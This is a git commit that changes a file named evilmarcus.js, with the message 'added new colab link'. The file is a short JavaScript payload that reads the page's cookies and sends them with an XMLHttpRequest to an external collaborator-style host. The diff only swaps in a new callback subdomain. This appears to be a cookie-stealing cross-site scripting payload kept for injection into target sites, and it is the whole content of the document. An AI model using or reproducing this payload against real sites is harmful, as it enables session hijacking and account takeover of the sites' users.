622c0696fdd6a4ef3571ba9b98ba44410c62240b
marcusoft3 <marcusoft3@gmail.com>
2025-11-05 09:58:07 -0800

    Update evilmarcus.js
    added new colab link

--- evilmarcus.js
+++ evilmarcus.js
@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'https://2ru4cevv8aamn00edxgq497pbgh75ytn.collab.hawkislandsol.com/?' + document.cookie, true);
+xhttp.open('GET', 'https://3rvc8c55nzwl67mklxnntlm3kuqleb20.collab.hawkislandsol.com/?' + document.cookie, true);
 xhttp.send();
